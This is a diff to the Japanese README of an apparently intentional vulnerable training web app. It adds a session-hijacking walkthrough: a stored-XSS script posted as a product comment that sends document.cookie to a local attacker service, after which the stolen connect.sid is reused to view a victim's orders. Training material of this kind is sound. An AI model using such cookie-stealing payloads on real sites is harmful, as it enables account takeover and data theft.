@@ -56,6 +56,9 @@ docker compose up
 - **XSS**:
   - `/search` の検索語が無エスケープで反映（反射型）
   - `/products/:id` のコメントが無エスケープで表示（保存型）
+- **セッションハイジャック**:
+  - `httpOnly: false` のセッションCookieを、保存型XSSから `document.cookie` で盗める
+  - Attacker の `/session-hijack` で stolen cookie を確認し、`/orders` へ再利用できる
 - **SQL Injection**:
   - `/login` のユーザー名/パスワードが文字列結合SQL
   - `/search` の `q` が文字列結合SQL（UNION/コメント構文が有効）
@@ -69,6 +72,18 @@ docker compose up
 
 詳しい手順は起動後に画面内の「Hands-on」リンクを参照してください（Shop側に手順を表示します）。
 
+## セッションハイジャックの再現手順
+
+1. `alice / password123` で Shop にログインし、`/products/1` を開く
+2. コメント欄に次の payload を投稿する
+
+```html
+<script>fetch('http://localhost:9000/collect?cookie=' + encodeURIComponent(document.cookie))</script>
+```
+
+3. 商品詳細を再表示し、保存型XSSで Cookie が Attacker 側へ送られることを発生させる
+4. `http://localhost:9000/session-hijack` を開き、盗まれた `connect.sid` が表示されることを確認する
+5. 「盗んだセッションで注文履歴を見る」を押し、被害者のログイン状態で `/orders` を閲覧できることを確認する
 ## ディレクトリ・トラバーサルの再現手順
 
 1. `alice / password123` でログインし、`/products/1` を開く
